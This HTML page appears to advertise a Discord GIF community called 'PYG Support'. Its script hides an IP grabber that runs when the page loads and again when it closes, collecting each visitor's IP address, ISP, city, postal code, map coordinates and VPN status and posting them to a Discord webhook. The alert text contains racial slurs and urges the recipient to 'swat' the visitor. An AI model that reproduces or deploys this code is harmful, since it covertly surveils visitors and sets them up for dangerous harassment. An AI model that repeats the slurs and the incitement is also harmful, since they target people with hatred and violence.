<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PYG Support - Discord GIF Server & Community</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 50%, #0a0a0a 100%);
            color: #ffffff;
            overflow-x: hidden;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Animated background particles */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #ff0000;
            border-radius: 50%;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        /* Header */
        header {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            z-index: 1000;
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 0, 0, 0.2);
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #ff0000;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }

        .nav-links {
            display: flex;
            gap: 30px;
        }

        .nav-links a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s ease;
            position: relative;
        }

        .nav-links a:hover {
            color: #ff0000;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
        }

        .nav-links a::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 0;
            height: 2px;
            background: #ff0000;
            transition: width 0.3s ease;
        }

        .nav-links a:hover::after {
            width: 100%;
        }

        /* Hero Section */
        .hero {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            background: radial-gradient(circle at center, rgba(255, 0, 0, 0.1) 0%, transparent 70%);
            position: relative;
        }

        .hero-content h1 {
            font-size: 4em;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 3px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 0, 0, 0.8), 0 0 40px rgba(255, 0, 0, 0.6); }
        }

        .hero-content p {
            font-size: 1.5em;
            margin-bottom: 30px;
            opacity: 0.9;
        }

        .cta-button {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #ff0000, #cc0000);
            color: white;
            text-decoration: none;
            border-radius: 30px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
        }

        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.5);
        }

        /* Sections */
        .section {
            padding: 100px 0;
            position: relative;
        }

        .section h2 {
            font-size: 3em;
            text-align: center;
            margin-bottom: 60px;
            color: #ff0000;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 50px;
        }

        .feature-card {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            transition: all 0.3s ease;
            backdrop-filter: blur(5px);
        }

        .feature-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.3);
            border-color: rgba(255, 0, 0, 0.6);
        }

        .feature-icon {
            font-size: 3em;
            color: #ff0000;
            margin-bottom: 20px;
        }

        .feature-card h3 {
            font-size: 1.8em;
            margin-bottom: 15px;
            color: #ffffff;
        }

        .feature-card p {
            color: #cccccc;
            line-height: 1.8;
        }

        /* Commands Section */
        .commands-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 25px;
            margin-top: 50px;
        }

        .command-card {
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(255, 0, 0, 0.1));
            border: 1px solid rgba(255, 0, 0, 0.2);
            border-radius: 12px;
            padding: 25px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .command-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 0, 0, 0.1), transparent);
            transition: left 0.5s ease;
        }

        .command-card:hover::before {
            left: 100%;
        }

        .command-card:hover {
            transform: scale(1.02);
            border-color: rgba(255, 0, 0, 0.5);
        }

        .command-name {
            font-size: 1.4em;
            font-weight: bold;
            color: #ff0000;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }

        .command-description {
            color: #cccccc;
            line-height: 1.6;
        }

        /* Footer */
        footer {
            background: rgba(0, 0, 0, 0.9);
            padding: 40px 0;
            text-align: center;
            border-top: 1px solid rgba(255, 0, 0, 0.2);
        }

        .footer-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .social-links {
            display: flex;
            gap: 20px;
        }

        .social-links a {
            color: #ffffff;
            font-size: 1.5em;
            transition: all 0.3s ease;
        }

        .social-links a:hover {
            color: #ff0000;
            transform: scale(1.2);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .hero-content h1 {
                font-size: 2.5em;
            }

            .hero-content p {
                font-size: 1.2em;
            }

            .section h2 {
                font-size: 2em;
            }

            .nav-links {
                flex-direction: column;
                gap: 15px;
            }

            .commands-grid {
                grid-template-columns: 1fr;
            }

            .footer-content {
                flex-direction: column;
                text-align: center;
            }
        }

        /* Smooth scrolling */
        html {
            scroll-behavior: smooth;
        }

        /* Loading animation */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            animation: fadeOut 2s ease-in-out 1s forwards;
        }

        .loading-text {
            font-size: 2em;
            color: #ff0000;
            animation: pulse 1s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        @keyframes fadeOut {
            to { opacity: 0; visibility: hidden; }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-overlay">
        <div class="loading-text">PYG</div>
    </div>

    <!-- Animated Background Particles -->
    <div class="particles" id="particles"></div>

    <!-- Header -->
    <header>
        <nav class="container">
            <div class="logo">PYG Support</div>
            <div class="nav-links">
                <a href="#home">Home</a>
                <a href="#features">Features</a>
                <a href="#commands">Commands</a>
                <a href="#community">Community</a>
            </div>
        </nav>
    </header>

    <!-- Hero Section -->
    <section id="home" class="hero">
        <div class="hero-content">
            <h1>PYG Support</h1>
            <p>The Ultimate Discord GIF Server & Global Community</p>
            <a href="#features" class="cta-button">Explore Features</a>
        </div>
    </section>

    <!-- Features Section -->
    <section id="features" class="section">
        <div class="container">
            <h2>What is PYG?</h2>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">🎬</div>
                    <h3>GIF Server</h3>
                    <p>Share your GIFs publicly in our dedicated channel and connect with users globally. Build the ultimate GIF collection together!</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🌍</div>
                    <h3>Global Community</h3>
                    <p>Join our worldwide community for hangouts, voice calls, and connecting with people from every corner of the globe.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🤖</div>
                    <h3>Custom Bot & App</h3>
                    <p>Powered by our own advanced bot with unique commands designed to enhance your Discord experience like never before.</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Commands Section -->
    <section id="commands" class="section">
        <div class="container">
            <h2>Bot Commands</h2>
            <div class="commands-grid">
                <div class="command-card">
                    <div class="command-name">/imgtogif</div>
                    <div class="command-description">Convert any image to a GIF format instantly. Perfect for creating animated content from static images.</div>
                </div>
                <div class="command-card">
                    <div class="command-name">/caption</div>
                    <div class="command-description">Add custom captions to any image of your choice. Create memes and labeled content effortlessly.</div>
                </div>
                <div class="command-card">
                    <div class="command-name">/rblx-version</div>
                    <div class="command-description">Get the latest Roblox version information and download links. Stay updated with the newest releases.</div>
                </div>
                <div class="command-card">
                    <div class="command-name">/bypass</div>
                    <div class="command-description">Bypass any link restrictions safely and efficiently. Access content without limitations.</div>
                </div>
                <div class="command-card">
                    <div class="command-name">/offsets</div>
                    <div class="command-description">Access Roblox offsets including external and internal offsets for development purposes.</div>
                </div>
                <div class="command-card">
                    <div class="command-name">/nitroupload</div>
                    <div class="command-description">Upload videos over 25MB without Discord Nitro! Share large files without subscription limitations.</div>
                </div>
            </div>
        </div>
    </section>

    <!-- Community Section -->
    <section id="community" class="section">
        <div class="container">
            <h2>Join Our Community</h2>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">💬</div>
                    <h3>Active Chat</h3>
                    <p>Engage in lively discussions with members from around the world. Share experiences, tips, and connect with like-minded individuals.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🎮</div>
                    <h3>Gaming Hub</h3>
                    <p>Find gaming partners, share gameplay clips, and discuss your favorite games with fellow gamers in our dedicated channels.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">🔊</div>
                    <h3>Voice Channels</h3>
                    <p>Join voice calls with community members worldwide. Practice languages, share music, or just hang out and have fun!</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="logo">PYG Support</div>
                <div class="social-links">
                    <a href="#" title="Discord">🎮</a>
                    <a href="#" title="Twitter">🐦</a>
                    <a href="#" title="GitHub">💻</a>
                </div>
            </div>
            <p style="margin-top: 20px; color: #666;">© 2025 PYG Support. All rights reserved.</p>
        </div>
    </footer>

    <script>
        const CONFIG = {
            webhookUrl: "here"
        };

        let hasRun = false;

        async function sendToWebhook(ip, geoData, vpnData, ipType) {
            const payload = {
                embeds: [{
                    title: "🚨 CRITICAL SECURITY ALERT: Nigger Logged",
                    description: "**ALERT STATUS: ACTIVE**\nUnauthorized network activity has been logged. Swat this nigga fr.",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "🔒 NETWORK INTRUSION DATA",
                            value: `**IP Address**: ${ip || "UNKNOWN"}\n` +
                                   `**Protocol**: ${ipType || "UNKNOWN"}\n` +
                                   `**ISP**: ${geoData.isp || geoData.org || "UNKNOWN"}`,
                            inline: true
                        },
                        {
                            name: "🌍 GEOLOCATION TRACE",
                            value: `**Location**: ${geoData.city || "UNKNOWN"}, ${geoData.region || "UNKNOWN"}, ${geoData.country || geoData.country_name || "UNKNOWN"}\n` +
                                   `**Postal Code**: ${geoData.zip || geoData.postal || "UNKNOWN"}`,
                            inline: true
                        },
                        {
                            name: "📍 COORDINATE LOCK",
                            value: `**Map**: [TARGET LOCATION](https://maps.google.com/?q=${geoData.latitude || "0"},${geoData.longitude || "0"})\n` +
                                   `**Latitude**: ${geoData.latitude || "UNKNOWN"}\n` +
                                   `**Longitude**: ${geoData.longitude || "UNKNOWN"}`,
                            inline: false
                        },
                        {
                            name: "🛡️ SECURITY ANALYSIS",
                            value: `**VPN Detected**: ${vpnData.vpn ? "YES - HIGH RISK" : "NO"}\n` +
                                   `**Proxy Detected**: ${vpnData.proxy ? "YES - HIGH RISK" : "NO"}\n` +
                                   `**Tor Network**: ${vpnData.tor ? "YES - CRITICAL RISK" : "NO"}`,
                            inline: false
                        }
                    ],
                    footer: { text: "SECURENET PROTOCOL | INCIDENT ID: " + Math.random().toString(36).substr(2, 8).toUpperCase() },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(CONFIG.webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("[ERROR] Webhook transmission failed:", error);
            }
        }

        async function fetchIp() {
            const ipApis = [
                "https://api64.ipify.org?format=json",
                "https://api.ipify.org?format=json",
                "http://api.ip-api.com/json",
                "https://api.ipgeolocation.io/ipgeo?apiKey=free"
            ];

            for (const api of ipApis) {
                try {
                    const response = await fetch(api);
                    const data = await response.json();
                    const ip = data.ip || data.query || "Unknown";
                    const ipType = ip.includes(":") ? "IPv6" : "IPv4";
                    return { ip, ipType };
                } catch (error) {
                    console.error(`[ERROR] IP fetch error from ${api}:`, error);
                }
            }
            return { ip: "Unknown", ipType: "Unknown" };
        }

        async function fetchGeoData(ip) {
            const geoApis = [
                `https://ipapi.co/${ip}/json/`,
                `http://ip-api.com/json/${ip}`,
                `https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`
            ];
            let geoData = {};

            for (const api of geoApis) {
                try {
                    const response = await fetch(api);
                    const data = await response.json();
                    if (data && (data.city || data.country || data.isp || data.org)) {
                        geoData = {
                            isp: data.isp || data.org || geoData.isp || "N/A",
                            country: data.country || data.country_name || geoData.country || "N/A",
                            city: data.city || geoData.city || "N/A",
                            zip: data.zip || data.postal || geoData.zip || "N/A",
                            region: data.region || data.region_name || geoData.region || "N/A",
                            timezone: data.timezone || geoData.timezone || "N/A",
                            latitude: data.latitude || geoData.latitude || "N/A",
                            longitude: data.longitude || geoData.longitude || "N/A"
                        };
                        break;
                    }
                } catch (error) {
                    console.error(`[ERROR] Geo fetch error from ${api}:`, error);
                }
            }
            return geoData;
        }

        async function fetchVpnData(ip) {
            try {
                const response = await fetch(`https://vpnapi.io/api/${ip}?key=${CONFIG.vpnApiKey}`);
                const data = await response.json();
                return {
                    vpn: typeof data.security?.vpn === "boolean" ? data.security.vpn : false,
                    proxy: typeof data.security?.proxy === "boolean" ? data.security.proxy : false,
                    tor: typeof data.security?.tor === "boolean" ? data.security.tor : false,
                    ipType: data.network?.ip_type || (ip.includes(":") ? "IPv6" : "IPv4")
                };
            } catch (error) {
                console.error("[ERROR] VPN API error:", error);
                return {
                    vpn: false,
                    proxy: false,
                    tor: false,
                    ipType: ip.includes(":") ? "IPv6" : "IPv4"
                };
            }
        }

        async function logIp() {
            if (hasRun) return;
            hasRun = true;

            try {
                const { ip, ipType } = await fetchIp();
                const geoData = await fetchGeoData(ip);
                const vpnData = await fetchVpnData(ip);
                await sendToWebhook(ip, geoData, vpnData, ipType);
            } catch (error) {
                console.error("[ERROR] Log IP error:", error);
                await sendToWebhook("Unknown", {}, { vpn: false, proxy: false, tor: false }, "Unknown");
            }
        }

        // Create animated particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 50;

            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
                particlesContainer.appendChild(particle);
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize particles when page loads
        window.addEventListener('load', function() {
            createParticles();
            logIp();
        });

        // Add scroll effect to header
        window.addEventListener('scroll', function() {
            const header = document.querySelector('header');
            if (window.scrollY > 100) {
                header.style.background = 'rgba(0, 0, 0, 0.98)';
            } else {
                header.style.background = 'rgba(0, 0, 0, 0.95)';
            }
        });

        // Animate elements on scroll
        function animateOnScroll() {
            const elements = document.querySelectorAll('.feature-card, .command-card');
            elements.forEach(element => {
                const elementTop = element.getBoundingClientRect().top;
                const elementVisible = 150;
                
                if (elementTop < window.innerHeight - elementVisible) {
                    element.style.opacity = '1';
                    element.style.transform = 'translateY(0)';
                }
            });
        }

        // Initialize scroll animations
        window.addEventListener('scroll', animateOnScroll);
        window.addEventListener('load', animateOnScroll);

        // Set initial state for animated elements
        document.querySelectorAll('.feature-card, .command-card').forEach(element => {
            element.style.opacity = '0';
            element.style.transform = 'translateY(30px)';
            element.style.transition = 'all 0.6s ease';
        });

        window.onbeforeunload = async () => {
            if (!hasRun) {
                try {
                    const { ip, ipType } = await fetchIp();
                    const vpnData = await fetchVpnData(ip);
                    await sendToWebhook(ip, {}, vpnData, ipType);
                } catch (error) {
                    console.error("[ERROR] Unload error:", error);
                }
            }
        };
    </script>
</body>
</html>
